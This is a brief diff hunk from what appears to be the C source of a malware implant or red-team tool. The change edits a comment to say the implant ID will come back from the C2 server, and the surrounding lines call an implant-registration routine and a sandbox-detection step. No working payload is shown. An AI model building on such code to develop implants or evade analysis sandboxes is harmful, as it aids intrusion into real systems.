@@ -92,7 +92,9 @@ int main(int argc, char* argv[]){
     /* Registering Implant */
     registerimplant();
 
-    /* HOW ARE WE GETTING IMPLANT ID?*/
+    /* HOW ARE WE GETTING IMPLANT ID? 
+        - it will be sent back from C2
+    */
 
     /* Sandbox Detection */
     printf("Executing Sandbox Detection\n");
